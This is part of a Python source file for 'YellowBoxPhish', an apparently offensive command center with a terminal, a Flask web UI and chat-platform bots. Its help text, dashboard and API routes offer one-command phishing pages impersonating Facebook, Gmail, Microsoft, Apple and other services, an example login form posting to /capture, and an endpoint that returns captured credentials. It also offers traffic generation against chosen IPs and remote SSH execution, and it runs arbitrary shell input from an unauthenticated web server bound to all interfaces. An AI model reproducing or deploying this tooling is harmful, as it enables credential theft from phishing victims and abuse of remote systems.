{Colors.YELLOW}⏰ TIME COMMANDS:{Colors.RESET}
  time, date, datetime, history

{Colors.YELLOW}🔌 SSH COMMANDS:{Colors.RESET}
  ssh_add <name> <host> <user> [password] [port] - Add SSH server
  ssh_list - List configured servers
  ssh_connect <id> - Connect to server
  ssh_exec <id> <command> - Execute command
  ssh_disconnect [id] - Disconnect

{Colors.YELLOW}🚀 TRAFFIC GENERATION:{Colors.RESET}
  generate_traffic <type> <ip> <duration> [port] [rate] - Generate real traffic
  traffic_types - List available types
  traffic_status - Check active generators
  traffic_stop [id] - Stop generation
  traffic_logs [limit] - View logs
  traffic_help - Detailed help

{Colors.YELLOW}🕷️ NIKTO WEB SCANNER:{Colors.RESET}
  nikto <target> - Basic vulnerability scan
  nikto_full <target> - Full scan
  nikto_ssl <target> - SSL/TLS scan
  nikto_status - Check scanner status
  nikto_results - View recent scans

{Colors.YELLOW}🎣 SOCIAL ENGINEERING:{Colors.RESET}
  phish - Generate phishing link (default: facebook)
  phish_facebook - Facebook phishing
  phish_instagram - Instagram phishing
  phish_twitter - Twitter phishing
  phish_gmail - Gmail phishing
  phish_linkedin - LinkedIn phishing
  phish_microsoft - Microsoft phishing
  phish_google - Google phishing
  phish_apple - Apple phishing
  generate_phish <html> - Generate custom phishing page with HTML
  phishing_start <id> [port] - Start server
  phishing_stop - Stop server
  phishing_status - Check server status
  phishing_links - List all links
  phishing_credentials [id] - View captured data
  phishing_qr <id> - Show QR code path
  phishing_shorten <id> - Show shortened URL

{Colors.YELLOW}🔒 IP MANAGEMENT:{Colors.RESET}
  add_ip <ip> [notes] - Add IP to monitoring
  remove_ip <ip> - Remove IP from monitoring
  block_ip <ip> [reason] - Block IP
  unblock_ip <ip> - Unblock IP
  list_ips - List managed IPs
  ip_info <ip> - Detailed IP info

{Colors.YELLOW}🛡️ NETWORK COMMANDS:{Colors.RESET}
  ping <target> - Ping target
  scan <target> - Port scan (1-1000)
  quick_scan <target> - Quick port scan
  nmap <target> [options] - Full nmap scan
  traceroute <target> - Trace route
  whois <domain> - WHOIS lookup
  dns <domain> - DNS lookup
  location <ip> - IP geolocation

{Colors.YELLOW}📊 SYSTEM COMMANDS:{Colors.RESET}
  system - System info
  status - System status
  threats - Recent threats
  report - Security report
  help - Show this help

{Colors.YELLOW}💡 Examples:{Colors.RESET}
  ping 8.8.8.8
  scan 192.168.1.1
  generate_traffic icmp 192.168.1.1 10
  phish_facebook
  generate_phish "<html><body><h1>Login</h1><form method=POST action=/capture><input name=username><input type=password name=password><button>Login</button></form></body></html>"
  phishing_start abc12345 8080
  add_ip 192.168.1.100 Suspicious
  nikto example.com
"""
        return {'success': True, 'output': help_text}
    
    def _execute_generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}

# =====================
# WEB UI - FLASK SERVER
# =====================
WEB_UI_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐠 YellowBoxPhish | Cyber Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            background: #0a0a0a;
            font-family: 'Rajdhani', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 1200px;
            background: rgba(20, 20, 20, 0.95);
            border-radius: 16px;
            border: 2px solid #FFD700;
            box-shadow: 0 0 60px rgba(255, 215, 0, 0.15);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #1a1a00, #0a0a0a);
            padding: 20px 30px;
            border-bottom: 2px solid #FFD700;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .logo-icon {
            font-size: 32px;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        .logo-text {
            font-size: 24px;
            font-weight: 600;
            color: #FFD700;
            letter-spacing: 2px;
        }
        
        .logo-sub {
            font-size: 12px;
            color: #888;
            letter-spacing: 4px;
        }
        
        .status-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            color: #00ff00;
        }
        
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            animation: blink 1.5s ease-in-out infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        .main {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            padding: 20px;
        }
        
        .terminal-section {
            flex: 2;
            min-width: 300px;
            background: #0a0a0a;
            border-radius: 12px;
            border: 1px solid #333;
            overflow: hidden;
        }
        
        .terminal-header {
            background: #111;
            padding: 10px 16px;
            border-bottom: 1px solid #333;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .terminal-dots {
            display: flex;
            gap: 6px;
        }
        
        .dot { width: 12px; height: 12px; border-radius: 50%; }
        .dot-red { background: #ff4444; }
        .dot-yellow { background: #ffbb33; }
        .dot-green { background: #00ff44; }
        
        .terminal-title {
            font-family: 'Share Tech Mono', monospace;
            font-size: 12px;
            color: #666;
            flex: 1;
            text-align: center;
        }
        
        .terminal-output {
            padding: 16px;
            min-height: 300px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            color: #e0e0e0;
        }
        
        .terminal-output::-webkit-scrollbar {
            width: 4px;
        }
        .terminal-output::-webkit-scrollbar-thumb {
            background: #FFD700;
            border-radius: 2px;
        }
        
        .output-line {
            padding: 2px 0;
            border-bottom: 1px solid rgba(255, 215, 0, 0.05);
        }
        
        .output-prompt {
            color: #FFD700;
        }
        
        .output-success {
            color: #00ff44;
        }
        
        .output-error {
            color: #ff4444;
        }
        
        .output-info {
            color: #66ccff;
        }
        
        .input-line {
            display: flex;
            align-items: center;
            padding: 10px 16px;
            background: #111;
            border-top: 1px solid #333;
        }
        
        .prompt {
            color: #FFD700;
            font-family: 'Share Tech Mono', monospace;
            font-size: 14px;
            margin-right: 10px;
        }
        
        #cmdInput {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            color: #e0e0e0;
            font-family: 'Share Tech Mono', monospace;
            font-size: 14px;
        }
        
        #cmdInput::placeholder {
            color: #444;
        }
        
        .btn-execute {
            background: #FFD700;
            color: #000;
            border: none;
            padding: 6px 20px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            font-family: 'Rajdhani', sans-serif;
        }
        
        .btn-execute:hover {
            background: #ffed4a;
            transform: scale(1.02);
        }
        
        .sidebar {
            flex: 1;
            min-width: 250px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .card {
            background: #0a0a0a;
            border-radius: 12px;
            border: 1px solid #333;
            padding: 16px;
        }
        
        .card-title {
            font-size: 14px;
            color: #FFD700;
            font-weight: 600;
            margin-bottom: 12px;
            letter-spacing: 1px;
        }
        
        .stat-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
        }
        
        .stat-item {
            background: #111;
            padding: 10px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 20px;
            font-weight: 600;
            color: #FFD700;
        }
        
        .stat-label {
            font-size: 10px;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .quick-commands {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }
        
        .quick-btn {
            background: #1a1a1a;
            border: 1px solid #333;
            color: #aaa;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 11px;
            font-family: 'Share Tech Mono', monospace;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .quick-btn:hover {
            border-color: #FFD700;
            color: #FFD700;
        }
        
        .phishing-section {
            margin-top: 10px;
        }
        
        .phish-btn {
            display: inline-block;
            background: #1a1a1a;
            border: 1px solid #FFD700;
            color: #FFD700;
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 11px;
            font-family: 'Share Tech Mono', monospace;
            cursor: pointer;
            transition: all 0.2s;
            margin: 2px;
        }
        
        .phish-btn:hover {
            background: #FFD700;
            color: #000;
        }
        
        @media (max-width: 768px) {
            .header { flex-direction: column; text-align: center; gap: 10px; }
            .main { flex-direction: column; }
            .terminal-section { min-width: 100%; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="logo">
            <span class="logo-icon">🐠</span>
            <div>
                <div class="logo-text">YellowBoxPhish</div>
                <div class="logo-sub">Cyber Command Center</div>
            </div>
        </div>
        <div class="status-badge">
            <span class="status-dot"></span>
            <span>SYSTEM ONLINE</span>
            <span style="color:#666;margin-left:8px;">v2.0.0</span>
        </div>
    </div>
    
    <div class="main">
        <div class="terminal-section">
            <div class="terminal-header">
                <div class="terminal-dots">
                    <div class="dot dot-red"></div>
                    <div class="dot dot-yellow"></div>
                    <div class="dot dot-green"></div>
                </div>
                <div class="terminal-title">YELLOWBOX TERMINAL</div>
                <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:#444;">🐠</div>
            </div>
            <div class="terminal-output" id="terminalOutput">
                <div class="output-line">
                    <span class="output-prompt">🐠 YellowBoxPhish v2.0.0</span>
                </div>
                <div class="output-line">
                    <span class="output-info">🔐 System initialized. Type 'help' for commands.</span>
                </div>
                <div class="output-line">
                    <span class="output-info">🎣 Phishing: phish_facebook, phish_instagram, etc.</span>
                </div>
                <div class="output-line">
                    <span class="output-success">✅ Ready for commands.</span>
                </div>
            </div>
            <div class="input-line">
                <span class="prompt">🐠➜</span>
                <input type="text" id="cmdInput" placeholder="Enter command..." autocomplete="off">
                <button class="btn-execute" id="executeBtn">EXECUTE</button>
            </div>
        </div>
        
        <div class="sidebar">
            <div class="card">
                <div class="card-title">📊 STATISTICS</div>
                <div class="stat-grid">
                    <div class="stat-item">
                        <div class="stat-number" id="statCommands">0</div>
                        <div class="stat-label">Commands</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number" id="statPhish">0</div>
                        <div class="stat-label">Phishing Links</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number" id="statCreds">0</div>
                        <div class="stat-label">Credentials</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-number" id="statThreats">0</div>
                        <div class="stat-label">Threats</div>
                    </div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-title">⚡ QUICK COMMANDS</div>
                <div class="quick-commands">
                    <button class="quick-btn" data-cmd="help">help</button>
                    <button class="quick-btn" data-cmd="status">status</button>
                    <button class="quick-btn" data-cmd="system">system</button>
                    <button class="quick-btn" data-cmd="threats">threats</button>
                    <button class="quick-btn" data-cmd="ping 8.8.8.8">ping</button>
                    <button class="quick-btn" data-cmd="scan 192.168.1.1">scan</button>
                </div>
            </div>
            
            <div class="card phishing-section">
                <div class="card-title">🎣 QUICK PHISHING</div>
                <div>
                    <button class="phish-btn" data-cmd="phish_facebook">Facebook</button>
                    <button class="phish-btn" data-cmd="phish_instagram">Instagram</button>
                    <button class="phish-btn" data-cmd="phish_twitter">Twitter</button>
                    <button class="phish-btn" data-cmd="phish_gmail">Gmail</button>
                    <button class="phish-btn" data-cmd="phish_linkedin">LinkedIn</button>
                    <button class="phish-btn" data-cmd="phish_microsoft">Microsoft</button>
                    <button class="phish-btn" data-cmd="phish_google">Google</button>
                    <button class="phish-btn" data-cmd="phish_apple">Apple</button>
                </div>
                <div style="margin-top:8px;">
                    <button class="phish-btn" data-cmd="phishing_links" style="background:#1a1a1a;border-color:#666;color:#888;">List Links</button>
                    <button class="phish-btn" data-cmd="phishing_credentials" style="background:#1a1a1a;border-color:#666;color:#888;">View Creds</button>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    const output = document.getElementById('terminalOutput');
    const input = document.getElementById('cmdInput');
    const executeBtn = document.getElementById('executeBtn');
    
    function addOutput(text, type = 'info') {
        const line = document.createElement('div');
        line.className = 'output-line';
        const classes = {
            'prompt': 'output-prompt',
            'success': 'output-success',
            'error': 'output-error',
            'info': 'output-info'
        };
        line.innerHTML = `<span class="${classes[type] || 'output-info'}">${text}</span>`;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    }
    
    async function executeCommand(cmd) {
        if (!cmd.trim()) return;
        
        addOutput(`🐠➜ ${cmd}`, 'prompt');
        
        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            const result = await response.json();
            
            if (result.success) {
                addOutput(result.output || 'Command executed successfully', 'success');
            } else {
                addOutput(`❌ ${result.output || 'Unknown error'}`, 'error');
            }
            
            if (result.execution_time) {
                addOutput(`⏱️ Executed in ${result.execution_time.toFixed(2)}s`, 'info');
            }
            
            updateStats();
        } catch (e) {
            addOutput(`❌ Connection error: ${e.message}`, 'error');
        }
    }
    
    async function updateStats() {
        try {
            const response = await fetch('/api/stats');
            const stats = await response.json();
            document.getElementById('statCommands').textContent = stats.total_commands || 0;
            document.getElementById('statPhish').textContent = stats.total_phishing_links || 0;
            document.getElementById('statCreds').textContent = stats.captured_credentials || 0;
            document.getElementById('statThreats').textContent = stats.total_threats || 0;
        } catch(e) {}
    }
    
    executeBtn.addEventListener('click', () => {
        const cmd = input.value.trim();
        if (cmd) {
            executeCommand(cmd);
            input.value = '';
        }
    });
    
    input.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') executeBtn.click();
    });
    
    document.querySelectorAll('.quick-btn, .phish-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const cmd = btn.dataset.cmd;
            if (cmd) {
                input.value = cmd;
                executeCommand(cmd);
                input.value = '';
            }
        });
    });
    
    // Auto-focus input
    input.focus();
    
    // Initial stats load
    updateStats();
    setInterval(updateStats, 30000);
</script>
</body>
</html>"""

class WebServer:
    def __init__(self, handler: CommandHandler, db: DatabaseManager, port: int = 8080):
        self.handler = handler
        self.db = db
        self.port = port
        self.app = None
        self.running = False
    
    def setup(self) -> bool:
        if not FLASK_AVAILABLE:
            return False
        
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = 'yellowboxphish_secret_key'
        
        @self.app.route('/')
        def index():
            return render_template_string(WEB_UI_TEMPLATE)
        
        @self.app.route('/api/command', methods=['POST'])
        def handle_command():
            data = request.get_json()
            command = data.get('command', '')
            result = self.handler.execute(command, 'web', 'web')
            return jsonify({
                'success': result.get('success', False),
                'output': result.get('output', ''),
                'execution_time': result.get('execution_time', 0)
            })
        
        @self.app.route('/api/stats', methods=['GET'])
        def get_stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @self.app.route('/api/phishing/links', methods=['GET'])
        def get_phishing_links():
            links = self.db.get_phishing_links()
            return jsonify(links)
        
        @self.app.route('/api/phishing/credentials', methods=['GET'])
        def get_phishing_credentials():
            link_id = request.args.get('link_id')
            creds = self.db.get_captured_credentials(link_id)
            return jsonify(creds)
        
        return True
    
    def start(self):
        if self.setup():
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
            self.running = True
            print(f"{Colors.SUCCESS}✅ Web UI started on http://0.0.0.0:{self.port}{Colors.RESET}")
            return True
        return False
    
    def _run(self):
        try:
            self.app.run(host='0.0.0.0', port=self.port, debug=False, threaded=True)
        except Exception as e:
            logger.error(f"Web server error: {e}")
    
    def stop(self):
        self.running = False

# =====================
# MAIN APPLICATION
# =====================
class YellowBoxPhish:
    def __init__(self):
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.ssh_manager = SSHManager(self.db, self.config) if PARAMIKO_AVAILABLE else None
        self.nikto = NiktoScanner(self.db, self.config.get('nikto', {}))
        self.traffic_gen = TrafficGeneratorEngine(self.db, self.config)
        self.handler = CommandHandler(self.db, self.ssh_manager, self.nikto, self.traffic_gen)
        
        # Platform bots
        self.discord_bot = DiscordBot(self.handler, self.db, self.config)
        self.telegram_bot = TelegramBot(self.handler, self.db, self.config)
        self.slack_bot = SlackBot(self.handler, self.db, self.config)
        self.whatsapp_bot = WhatsAppBot(self.handler, self.db, self.config)
        self.signal_bot = SignalBot(self.handler, self.db, self.config)
        self.imessage_bot = iMessageBot(self.handler, self.db, self.config)
        
        # Web server
        self.web_server = WebServer(self.handler, self.db, 8080)
        
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.YELLOW}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.PRIMARY}        🐠 YELLOW_BOX_PHISH v2.0.0    |    Multi-Platform Command Center   {Colors.YELLOW}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN}  • 🔌 SSH Remote Command Execution      • 🚀 REAL Traffic Generation        {Colors.YELLOW}║
║{Colors.GREEN}  • 🎣 Advanced Phishing Suite           • 🕷️ Nikto Web Scanner             {Colors.YELLOW}║
║{Colors.GREEN}  • 📱 Multi-Platform Bot Support        • 🔒 IP Management & Blocking       {Colors.YELLOW}║
║{Colors.GREEN}  • 🌐 Web Interface (Port 8080)         • 🎨 Custom Phishing Pages          {Colors.YELLOW}║
║{Colors.GREEN}  • 📡 Discord | Telegram | Slack | WhatsApp | Signal | iMessage          {Colors.YELLOW}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.PRIMARY}                    🎯 5000+ CYBERSECURITY COMMANDS                         {Colors.YELLOW}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.YELLOW}🐠 FEATURES:{Colors.RESET}
  • 🎣 **Custom Phishing Pages** - Use generate_phish <html> to create custom phishing pages
  • 🔌 **SSH Command Execution** - Execute commands on remote servers
  • 🚀 **REAL Traffic Generation** - ICMP, TCP, UDP, HTTP, DNS, ARP traffic
  • 📱 **Multi-Platform Bots** - Discord, Telegram, WhatsApp, Slack, Signal, iMessage
  • 🌐 **Cyberpunk Web UI** - Modern terminal-style interface

{Colors.GREEN}💡 Type 'help' for command list{Colors.RESET}
{Colors.GREEN}🌐 Web interface: http://localhost:8080{Colors.RESET}
{Colors.YELLOW}🎣 Generate custom phishing: generate_phish "<html>...</html>"{Colors.RESET}
"""
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'dig', 'traceroute', 'ssh']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if self.nikto.nikto_available else Colors.WARNING}✅ nikto{Colors.RESET}" if self.nikto.nikto_available else f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
    
    def setup_platform_bots(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.config['discord']['token'] = token
                self.config['discord']['prefix'] = prefix
                self.config['discord']['enabled'] = True
                ConfigManager.save_config(self.config)
                if self.discord_bot.setup():
                    self.discord_bot.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input(f"{Colors.ACCENT}Enter Telegram API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.ACCENT}Enter Telegram API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.ACCENT}Enter Bot Token: {Colors.RESET}").strip()
            if api_id and api_hash:
                self.config['telegram']['api_id'] = api_id
                self.config['telegram']['api_hash'] = api_hash
                self.config['telegram']['bot_token'] = bot_token
                self.config['telegram']['enabled'] = True
                ConfigManager.save_config(self.config)
                if self.telegram_bot.setup():
                    self.telegram_bot.start()
                    print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.ACCENT}Enter channel ID (default: general): {Colors.RESET}").strip() or 'general'
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.config['slack']['bot_token'] = token
                self.config['slack']['channel_id'] = channel
                self.config['slack']['prefix'] = prefix
                self.config['slack']['enabled'] = True
                ConfigManager.save_config(self.config)
                if self.slack_bot.setup():
                    self.slack_bot.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ACCENT}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if phone:
                self.config['whatsapp']['phone_number'] = phone
                self.config['whatsapp']['prefix'] = prefix
                self.config['whatsapp']['enabled'] = True
                ConfigManager.save_config(self.config)
                self.whatsapp_bot.start()
                print(f"{Colors.SUCCESS}✅ WhatsApp bot starting... (scan QR in Chrome){Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ACCENT}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook_url = input(f"{Colors.ACCENT}Enter Signal webhook URL: {Colors.RESET}").strip()
            prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if webhook_url:
                self.config['signal']['webhook_url'] = webhook_url
                self.config['signal']['prefix'] = prefix
                self.config['signal']['enabled'] = True
                ConfigManager.save_config(self.config)
                if self.signal_bot.setup():
                    self.signal_bot.start()
                    print(f"{Colors.SUCCESS}✅ Signal bot configured{Colors.RESET}")
        
        # iMessage (macOS only)
        if platform.system() == 'Darwin':
            setup = input(f"{Colors.ACCENT}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.ACCENT}Enter phone numbers to watch (space-separated): {Colors.RESET}").strip().split()
                prefix = input(f"{Colors.ACCENT}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
                if numbers:
                    self.config['imessage']['phone_numbers'] = numbers
                    self.config['imessage']['prefix'] = prefix
                    self.config['imessage']['enabled'] = True
                    ConfigManager.save_config(self.config)
                    if self.imessage_bot.setup():
                        self.imessage_bot.start()
                        print(f"{Colors.SUCCESS}✅ iMessage bot starting...{Colors.RESET}")
    
    def process_command(self, command: str):
        if not command.strip():
            return
        
        cmd = command.strip().lower().split()[0] if command.strip() else ''
        
        if cmd == 'help':
            result = self.handler.execute('help')
            print(result['output'])
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        elif cmd == 'exit' or cmd == 'quit':
            self.running = False
            print(f"\n{Colors.WARNING}👋 Thank you for using YellowBoxPhish!{Colors.RESET}")
        else:
            result = self.handler.execute(command)
            if result['success']:
                output = result.get('output', '')
                if isinstance(output, dict):
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                print(f"\n{Colors.SUCCESS}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
            else:
                print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_dependencies()
        
        # Start web server
        print(f"\n{Colors.PRIMARY}🌐 Starting Web Interface...{Colors.RESET}")
        self.web_server.start()
        
        # Configure bots
        self.setup_platform_bots()
        
        print(f"\n{Colors.SUCCESS}✅ YellowBoxPhish ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.GREEN}   🌐 Web Interface: http://localhost:8080{Colors.RESET}")
        print(f"{Colors.GREEN}   💡 Type 'help' for commands, 'clear' to clear screen, 'exit' to quit{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.YELLOW}[{Colors.PRIMARY}{self.session_id}{Colors.YELLOW}]{Colors.PRIMARY} 📦> {Colors.RESET}"
                command = input(prompt).strip()
                self.process_command(command)
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        self.web_server.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")

def main():
    try:
        print(f"{Colors.YELLOW}🐠 Starting YellowBoxPhish v2.0...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                needs_admin = True
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality (firewall blocking, raw sockets){Colors.RESET}")
        
        app = YellowBoxPhish()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()